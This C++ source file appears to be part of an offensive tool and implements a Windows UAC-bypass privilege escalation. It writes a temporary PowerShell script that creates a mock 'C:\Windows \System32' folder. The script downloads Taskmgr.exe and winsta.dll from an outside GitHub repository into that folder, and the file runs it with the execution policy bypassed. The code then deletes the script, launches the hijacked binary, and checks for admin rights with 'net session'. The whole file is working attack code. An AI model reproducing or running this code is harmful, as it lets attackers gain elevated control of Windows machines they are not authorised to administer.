#include "PrivilegeEscalation.h"


// This function tries to privilege escalation
const bool PrivilegeEscalation::run(void)
{
    std::string path = System::getTempPath() + "\\test.ps1";
    std::ofstream file;
    file.open(path);
    file << "New-Item \"\\\\?\\C:\\Windows \\System32\" -ItemType Directory" << std::endl;
    file << "wget \"https://github.com/Eyalasulin999/FileForPrivilegeEscalation/raw/main/Taskmgr.exe\" -outfile \"C:\\Windows \\System32\\Taskmgr.exe\"" << std::endl;
    file << "wget \"https://github.com/Eyalasulin999/FileForPrivilegeEscalation/raw/main/winsta.dll\" -outfile \"C:\\Windows \\System32\\winsta.dll\"" << std::endl;
    file.close();
    std::string command = "powershell -ExecutionPolicy Bypass -F " + path;
    system(command.c_str());
    remove(path.c_str());
    system("\"C:\\Windows \\System32\\Taskmgr.exe\""); // POC
    return false;
}

// This function checks if the current process is run as system admin
const bool PrivilegeEscalation::systemAdminCheck(void)
{
    int exitCode = system("net session >nul 2>&1"); // This command require high-privileged user
    return !exitCode;
}
